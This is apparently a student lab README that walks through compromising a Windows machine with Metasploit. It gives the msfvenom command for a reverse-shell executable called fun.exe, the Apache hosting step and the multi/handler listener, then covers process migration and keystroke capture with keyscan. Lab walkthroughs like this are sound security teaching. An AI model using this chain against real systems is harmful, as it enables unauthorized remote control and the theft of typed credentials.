# Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:
## OUTPUT:
![eth ep 6 1](https://github.com/hema-dharshini5/Compromising-windows-using-Metasploit/assets/147117728/42c07380-31db-4e8f-a50f-dc79cbe7014e)

Create a malicious executable file fun.exe using msenom command msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe
## OUTPUT:
![ETH EP 6 2](https://github.com/hema-dharshini5/Compromising-windows-using-Metasploit/assets/147117728/981dae79-a184-4fe7-97fb-f06c1390355c)

copy the fun.exe into the apache /var/www/html folder

![ETH EP 6 3](https://github.com/hema-dharshini5/Compromising-windows-using-Metasploit/assets/147117728/dd0bc2d7-d144-42a9-a9a4-0fb8dc491ae1)

Start apache server sudo systemctl apache2 start

![ETH EP 6 4](https://github.com/hema-dharshini5/Compromising-windows-using-Metasploit/assets/147117728/9eb99679-ea0d-4ea0-97c0-f75407e31d23)

 Check the status of apache2

 ![ETH EP 6 5](https://github.com/hema-dharshini5/Compromising-windows-using-Metasploit/assets/147117728/27b142a8-4e44-447e-bed2-77e48cf0babb)
 
 Invoke msfconsole:
 ## OUTPUT:
 Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.

Starting a command and control Server use multi/handler set PAYLOAD windows/meterpreter/reverse_tcp set LHOST 0.0.0.0 exploit

![ETH EP 6 6](https://github.com/hema-dharshini5/Compromising-windows-using-Metasploit/assets/147117728/cac71c8f-d77f-45fa-bb28-ee8ceaa8cf94)

On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine: http://192.168.1.2/fun.exe The file "fun.exe" downloads.

![eth ep 6 7](https://github.com/hema-dharshini5/Compromising-windows-using-Metasploit/assets/147117728/ecd3b7e2-63d0-4e99-990d-95fbd3654662)

Bypass any warning boxes, double-click the file, and allow it to run.

On kali give the command exploit

![eth ep 6 8](https://github.com/hema-dharshini5/Compromising-windows-using-Metasploit/assets/147117728/c4b4e30a-88d4-4397-b4aa-e9a3e2136f0f)

To see a list of processes, at the meterpreter > prompt, execute this command: ps ⇒ can see the fun.exe process running with pid 1156

The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost. To become more persistent, we'll migrate to a process that will last longer. Let's migrate to the winlogon process. At the meterpreter > prompt, execute this command:

migrate -N explorer.exe at meterpreter > prompt, execute this command: netstat A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below. Notice the "PID/Program name" value for this connection, which is redacted

![eth ep 6 9](https://github.com/hema-dharshini5/Compromising-windows-using-Metasploit/assets/147117728/a9ce9410-a8f5-4a9d-974c-7d482492914f)

Post Exploitation The target is now owned. Following are meterpreter commands for key capturing in the target machine keyscan_start Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.

![eth ep 6 10](https://github.com/hema-dharshini5/Compromising-windows-using-Metasploit/assets/147117728/90eea5e9-aee0-4238-bc08-796d0a407cdc)

keyscan_dump Shows the keystrokes captured so far

![eth ep 6 11](https://github.com/hema-dharshini5/Compromising-windows-using-Metasploit/assets/147117728/a9863e2c-4d9a-4d10-b95a-ae69b44c3386)

## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.
